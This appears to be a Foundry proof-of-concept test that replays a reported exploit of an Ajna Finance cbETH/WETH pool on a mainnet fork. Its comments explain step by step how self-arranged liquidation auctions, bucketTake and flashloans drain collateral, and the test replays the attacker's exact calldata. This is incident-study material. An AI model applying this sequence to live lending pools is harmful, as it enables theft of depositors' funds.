// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// Ajna Finance — Ethereum mainnet — liquidation / bucketTake accounting manipulation
//
// ~$775K total drained across multiple Ajna ERC20 pools in one campaign (syrupUSDC $173.7K,
// wstETH $159.8K, rETH $127.4K + $15.6K, cbETH $124.8K + $12.1K, WBTC $101.8K,
// WETH/USDC $42.0K, sDAI $18.0K). Defimon detected the prepared attack contracts over an hour
// before the first exploit tx and warned Ajna's Discord; the team did not react in time.
//
// This PoC reproduces the cbETH-pool instance, which is the sample tx below and accounts for the
// ~$124.8K cbETH loss line. Every affected pool was hit with the SAME class of bug (a self-set-up
// liquidation auction drained via bucketTake/take), so replaying all seven is unnecessary — one
// faithful instance shows the mechanism.
//
// Sample tx  : 0x12dfde527ef62882bfabb64362c9ae0e6bfb628363bd298d0d0956c9a114e4f5
//              block 25854888, tx index 6
// Attacker EOA (this tx) : 0x6F2f5236b10FE7162Da077A2779f8b5f04b7827e
//              (campaign EOAs also include 0xc213145e... and 0xcccc6400...)
// Attacker contract      : 0x80AD419C4783A09252Ad6a576ce059f51Cc53D47 (entrypoint, selector 0xf1cd0d25)
// Attacker helper/router : 0xEB0f6A6255d354bc1E314AcCFfe1D0673fa14346
//
// Victim pool  : 0xad24FC773e125Edb223C38a39657cB64bc7C178e  (Ajna ERC20Pool, cbETH / WETH)
//   collateral : cbETH 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704 (Coinbase staked ETH)
//   quote      : WETH  0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
// Pool logic   : delegated to 0x05bB4F6362B02F17C1A3F2B047A8b23368269A21 (+ PoolCommons /
//                LenderActions / BorrowerActions / TakerActions libraries)
// Liquidated borrower (attacker-controlled) : 0x02D329Ebb1DA079A89988366b777aF300DB96F5f
//
// Mechanism (traced from the on-chain call tree, NOT a key/signer/privileged path):
//   Ajna is a permissionless, oracle-free lending protocol: there is no external price feed. A
//   pool's liquidation auction price and its lending "bucket" prices are derived entirely from the
//   pool's own on-chain state, which an attacker who controls both sides can shape. In prior txs
//   the attacker set up a borrower position (0x02D329...) and kicked it into a Dutch-auction
//   liquidation, and seeded deposit in a chosen high-price bucket (Fenwick index 2000). In this tx
//   the attacker, acting as taker/lender:
//     1. reads the live auction (auctionInfo on the pool),
//     2. calls the permissionless bucketTake(borrower, false, 2000) — exchanges bucket deposit for
//        auction collateral at the manipulated bucket price and mints itself bucket LP
//        (BucketTakeLPAwarded 7.068e22, BucketTake collateral 1.512e18),
//     3. removeCollateral(type(uint).max, 2000) — pulls the awarded collateral (cbETH) back out,
//     4. wraps the rest inside a Balancer flashLoan of 4 WETH so it can bucketTake/take again on
//        the same auction, then take(borrower, max, ...) settles it (Take + AuctionSettle),
//     5. repayDebt closes the attacker's own borrower, and the seized cbETH is swapped (Curve +
//        UniV3) partly to WETH to repay the flashloan, keeping the surplus.
//   The take/bucketTake collateral accounting lets the attacker walk out with far more collateral
//   value than the quote it paid in, because both the auction reference price and the bucket price
//   are values the attacker positioned itself, with no oracle to contradict them.
//
//   bucketTake, take, removeCollateral, repayDebt, addQuoteToken and the Balancer flashLoan are all
//   public/permissionless. The `validate(...)` staticcalls to 0x5508dF70... in the trace are the
//   attacker contract's OWN internal auth check (it keys off tx.origin), not any Ajna gate. No
//   admin, owner, or signer path exists in any leg.
//
// Faithful reproduction: fork at exploit block - 1 (real pool state, the standing attacker auction
// and bucket deposits already present) and replay the entrypoint tx's EXACT 196-byte calldata
// against the deployed attacker contract 0x80AD..., pranking the attacker EOA as BOTH msg.sender
// and tx.origin (so its tx.origin auth passes). The attacker contract runs the whole flashloan
// sequence internally.
//
// Net gain for this single tx (measured on-chain, block 25854887 -> 25854888):
//   attacker EOA        : +1.7194 WETH
//   attacker contract   : +43.7514 cbETH, -0.2150 WETH (its 0.215 WETH seed spent)
//   combined            : +43.7514 cbETH + ~1.5044 WETH  (~$124.8K, cbETH ~ ETH)

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract AjnaFinance_exp is Test {
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 constant cbETH = IERC20(0xBe9895146f7AF43049ca1c1AE358B0541Ea49704);

    address constant ATTACKER_EOA = 0x6F2f5236b10FE7162Da077A2779f8b5f04b7827e;
    address constant ATTACK_CONTRACT = 0x80AD419C4783A09252Ad6a576ce059f51Cc53D47;
    address constant AJNA_CBETH_POOL = 0xad24FC773e125Edb223C38a39657cB64bc7C178e;

    // Exact input of tx 0x12dfde52... : selector 0xf1cd0d25 + 6 words, hardcoded verbatim.
    bytes constant EXPLOIT_CALLDATA =
        hex"f1cd0d25000000000000000000000000eb0f6a6255d354bc1e314accffe1d0673fa1434600000000000000000000000000000000000000000000000017b3738fde8d07d70000000000000000000000000000000000000000000000003782dace9d9000290000000000000000000000000000000000000000000000029bea878c48d6f413000000000000000000000000000000000000000000000000000e35fa931a0001000000000000000000000000000000000000000000000002dcfe637b470603cb0000000000000000000000000000000000000000000000000000000000000000";

    function setUp() public {
        // fork one block before the exploit tx (state as of end of block 25854887)
        vm.createSelectFork("mainnet", 25_854_887);
        vm.label(ATTACKER_EOA, "AttackerEOA");
        vm.label(ATTACK_CONTRACT, "AttackerContract");
        vm.label(AJNA_CBETH_POOL, "AjnaCbethPool");
        vm.label(address(WETH), "WETH");
        vm.label(address(cbETH), "cbETH");
    }

    function testExploit() public {
        // combined attacker inventory (EOA + attacker contract), both tokens
        uint256 wethBefore = WETH.balanceOf(ATTACKER_EOA) + WETH.balanceOf(ATTACK_CONTRACT);
        uint256 cbethBefore = cbETH.balanceOf(ATTACKER_EOA) + cbETH.balanceOf(ATTACK_CONTRACT);

        emit log_named_decimal_uint("[before] attacker WETH ", wethBefore, 18);
        emit log_named_decimal_uint("[before] attacker cbETH", cbethBefore, 18);

        // replay: EOA calls its own contract with the exact on-chain calldata.
        // prank sets msg.sender AND tx.origin = attacker EOA, satisfying the contract's own
        // tx.origin auth check. Everything else (Balancer flashloan, Ajna bucketTake/take,
        // Curve/UniV3 swaps) runs inside the attacker contract, exactly as on-chain.
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        (bool ok,) = ATTACK_CONTRACT.call(EXPLOIT_CALLDATA);
        require(ok, "exploit replay reverted");
        vm.stopPrank();

        uint256 wethAfter = WETH.balanceOf(ATTACKER_EOA) + WETH.balanceOf(ATTACK_CONTRACT);
        uint256 cbethAfter = cbETH.balanceOf(ATTACKER_EOA) + cbETH.balanceOf(ATTACK_CONTRACT);

        emit log_named_decimal_uint("[after ] attacker WETH ", wethAfter, 18);
        emit log_named_decimal_uint("[after ] attacker cbETH", cbethAfter, 18);

        uint256 cbethGain = cbethAfter - cbethBefore;
        // cbETH ~ ETH; naive 1:1 ETH-equivalent of the extracted value for logging only
        uint256 ethEquivGain = cbethGain + wethAfter - wethBefore;
        emit log_named_decimal_uint("cbETH drained from pool", cbethGain, 18);
        emit log_named_decimal_uint("net gain (ETH-equiv ~) ", ethEquivGain, 18);

        // this tx seized ~43.75 cbETH of pool collateral ...
        assertGt(cbethGain, 43e18, "expected ~43.75 cbETH drained");
        // ... and the EOA also cashed out ~1.719 WETH
        assertGt(WETH.balanceOf(ATTACKER_EOA), 1.7e18, "expected ~1.719 WETH to EOA");
        // combined attacker position strictly grew (profit, not just a wash)
        assertGt(ethEquivGain, 45e18, "expected > 45 ETH-equiv net gain");
    }
}
